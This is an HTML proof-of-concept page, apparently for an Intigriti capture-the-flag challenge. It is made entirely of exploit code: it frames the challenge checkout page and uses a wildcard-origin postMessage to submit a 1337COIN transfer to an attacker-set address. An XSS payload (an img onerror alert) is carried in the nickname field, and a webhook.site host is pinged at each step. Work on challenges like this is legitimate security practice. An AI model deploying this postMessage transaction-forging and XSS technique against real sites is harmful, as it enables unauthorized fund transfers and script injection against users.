<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<h1>Loading...</h1>
<img src="https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876">
<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:400px"></iframe>
<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876';
const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

// Log start
new Image().src = WEBHOOK + '/?step=started';

const f = document.getElementById('f');

f.onload = function() {
  new Image().src = WEBHOOK + '/?step=iframe_loaded';

  setTimeout(function() {
    new Image().src = WEBHOOK + '/?step=sending_tx';

    // Send transaction to your address
    f.contentWindow.postMessage({
      type: 'submitTransaction',
      transaction: {
        toAddress: YOUR_ADDRESS,
        currency: '1337COIN',
        amount: 0.5,
        nickname: XSS_PAYLOAD
      }
    }, '*');

    new Image().src = WEBHOOK + '/?step=tx_sent';

    // Redirect after delay
    setTimeout(function() {
      new Image().src = WEBHOOK + '/?step=redirecting';
      window.location = BASE + '/marketwatch.html';
    }, 3000);
  }, 4000);
};
</script>
</body>
</html>
